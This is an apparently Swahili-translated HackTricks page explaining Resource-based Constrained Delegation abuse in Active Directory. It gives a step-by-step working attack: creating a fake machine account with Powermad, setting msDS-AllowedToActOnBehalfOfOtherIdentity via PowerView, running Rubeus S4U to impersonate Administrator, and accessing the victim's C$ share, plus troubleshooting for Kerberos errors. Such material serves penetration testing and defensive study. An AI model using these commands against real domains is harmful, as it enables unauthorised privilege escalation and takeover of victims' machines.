# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Msingi wa Resource-based Constrained Delegation

Hii ni sawa na [Constrained Delegation](constrained-delegation.md) ya msingi lakini **badala** ya kutoa ruhusa kwa **kitu** ku **jifanya kama mtumiaji yeyote dhidi ya mashine**. Resource-based Constrained Delegation **inasanifisha** katika **kitu ambacho kinaweza kujifanya kama mtumiaji yeyote dhidi yake**.

Katika kesi hii, kitu kilichozuiliwa kitakuwa na sifa inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji ambaye anaweza kujifanya kama mtumiaji mwingine dhidi yake.

Tofauti nyingine muhimu kutoka kwa Constrained Delegation hii hadi kwa delegations nyingine ni kwamba mtumiaji yeyote mwenye **ruhusa za kuandika juu ya akaunti ya mashine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji ruhusa za admin wa domain).

### Dhana Mpya

Katika Constrained Delegation ilisemwa kwamba bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika ili kutekeleza **S4U2Self.** Lakini hiyo si kweli kabisa.\
Ukweli ni kwamba hata bila thamani hiyo, unaweza kutekeleza **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **huduma** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **Forwardable** na ikiwa **huna** bendera hiyo TGS iliyorejeshwa **haitakuwa** **Forwardable**.

Hata hivyo, ikiwa **TGS** iliyotumika katika **S4U2Proxy** **SIO Forwardable** kujaribu kutumia **Constrain Delegation ya msingi** hakutafanya kazi. Lakini ikiwa unajaribu kutumia **Resource-Based constrain delegation, itafanya kazi**.

### Muundo wa Shambulio

> Ikiwa una **ruhusa sawa za kuandika** juu ya akaunti ya **Kompyuta** unaweza kupata **ufikiaji wa ruhusa** katika mashine hiyo.

Fikiria kwamba mshambuliaji tayari ana **ruhusa sawa za kuandika juu ya kompyuta ya mwathirika**.

1. Mshambuliaji **anachafua** akaunti ambayo ina **SPN** au **anaunda moja** (“Huduma A”). Kumbuka kwamba **mtumiaji yeyote** _Admin User_ bila ruhusa nyingine maalum anaweza **kuunda** hadi vitu 10 vya Kompyuta (**_MachineAccountQuota_**) na kuviweka **SPN**. Hivyo mshambuliaji anaweza tu kuunda kitu cha Kompyuta na kuweka SPN.
2. Mshambuliaji **anatumia ruhusa zake za KUANDIKA** juu ya kompyuta ya mwathirika (HudumaB) ili kuunda **resource-based constrained delegation ili kuruhusu HudumaA kujifanya kama mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathirika (HudumaB).
3. Mshambuliaji anatumia Rubeus kutekeleza **shambulio kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Huduma A hadi Huduma B kwa mtumiaji **aliye na ufikiaji wa ruhusa kwa Huduma B**.
1. S4U2Self (kutoka akaunti ya SPN iliyochafuliwa/iliyoundwa): Omba **TGS ya Msimamizi kwangu** (Sio Forwardable).
2. S4U2Proxy: Tumia **TGS isiyo Forwardable** ya hatua iliyopita kuomba **TGS** kutoka **Msimamizi** hadi **kompyuta ya mwathirika**.
3. Hata kama unatumia TGS isiyo Forwardable, kwa kuwa unatumia Resource-based constrained delegation, itafanya kazi.
4. Mshambuliaji anaweza **kupitisha tiketi** na **kujifanya** kama mtumiaji ili kupata **ufikiaji kwa HudumaB ya mwathirika**.

Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda Kituo cha Kompyuta

Unaweza kuunda kituo cha kompyuta ndani ya eneo kutumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kuunda Uwakilishi wa Kizazi Kizuri Kulingana na Rasilimali

**Kutumia moduli ya activedirectory PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kufanya shambulio kamili la S4U

Kwanza kabisa, tuliumba kituo kipya cha Kompyuta chenye nenosiri `123456`, hivyo tunahitaji hash ya nenosiri hilo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha hash za RC4 na AES za akaunti hiyo.\
Sasa, shambulio linaweza kufanywa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuunda tiketi zaidi za huduma zaidi kwa kuuliza mara moja ukitumia param ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kwamba watumiaji wana sifa inayoitwa "**Haiwezi kuwakilishwa**". Ikiwa mtumiaji ana sifa hii kuwa Kweli, huwezi kumwakilisha. Mali hii inaweza kuonekana ndani ya bloodhound.

### Accessing

Amri ya mwisho itatekeleza **shambulio kamili la S4U na itachoma TGS** kutoka kwa Administrator hadi mwenyeji wa mwathirika katika **kumbukumbu**.\
Katika mfano huu, ilihitajika TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Dhulumu tiketi tofauti za huduma

Jifunze kuhusu [**tiketi za huduma zinazopatikana hapa**](silver-ticket.md#available-services).

## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kwamba kerberos imewekwa kutotumia DES au RC4 na unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa tu hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kwamba wakati wa kompyuta ya sasa ni tofauti na ile ya DC na kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kwamba jina la mtumiaji lililotolewa + hash hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji unapozalisha hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
  - Mtumiaji unayejaribu kujifanya haiwezi kufikia huduma inayotakiwa (kwa sababu huwezi kujifanya au kwa sababu haina ruhusa za kutosha)
  - Huduma iliyoulizwa haipo (ikiwa unahitaji tiketi kwa winrm lakini winrm haifanyi kazi)
  - Kompyuta ya bandia iliyoundwa imepoteza ruhusa zake juu ya seva iliyo hatarini na unahitaji kuzirudisha.

## Marejeleo

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
